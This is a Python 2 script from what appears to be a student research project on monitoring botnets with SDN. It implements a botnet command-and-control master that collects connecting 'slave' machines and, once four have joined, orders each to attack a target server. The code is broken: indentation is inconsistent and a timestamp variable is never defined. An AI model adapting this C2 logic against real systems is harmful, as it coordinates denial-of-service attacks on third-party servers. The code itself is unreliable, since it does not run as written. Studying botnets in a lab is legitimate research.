## (c) Mehdi Mtimet and Geoffrey Boulanger 
## PFE - Monitoring de botnets a travers des reseaux SDN
## 2015 - 2016

import time, datetime, sys, re,ntplib
from socket import *  #importing the socket library for network connections
from time import ctime, time


# Server/BotMaster host that communicate with hte ill client / slave

SERVER_HOST = '10.0.0.2'
SERVER_PORT = 80
MS_LISTEN_HOST = '10.0.0.3'
MS_LISTEN_PORT = 80

class Master():
  def __init__(self, sock=None):
    if sock is None:
      self.sock = socket(AF_INET, SOCK_STREAM)
    else:
      self.sock = sock
    self.slaves = {}

    self.count=0
    ## EXEMPLE OF A BOTNET BEHAVIOR

    # The server to be attacked
    self.server_ip = SERVER_HOST
    self.server_port = SERVER_PORT

    # get ntp times
  

  def listenConnections(self, port):
    print "Listening for connections"
    self.sock.bind((MS_LISTEN_HOST, port))
    self.sock.listen(5)

  def acceptConnections(self):
    conn, addr = self.sock.accept()
    print('Accepting connection {0}'.format(addr))
    msg_buf = conn.recv(64)
    if len(msg_buf) > 0:
      #print(msg_buf)
      self.count+=1
      print "Slave "+str(self.count)+" connected at: "+msg_buf
    conn.send('Connected to Master at: {0}'.format(ctime(self.ntp_res)))
    self.slaves[addr] = conn

  def launchAttack(self):
	  for slave_addr, conn in self.slaves.iteritems():
	  # get ntp times
     
      conn.send('ATTACK {0} {1} {2}'.format(self.server_ip, self.server_port, ntp_res))
    print "All Slaves ready to ATTACK!!!"

  def closeConnection(self):
    self.sock.close()

if __name__ == '__main__':
    port = MS_LISTEN_PORT
    masterServer = Master()
    masterServer.listenConnections(port)
    while 1:
      masterServer.acceptConnections()
      if len(masterServer.slaves) >= 4:
        break
    masterServer.launchAttack()
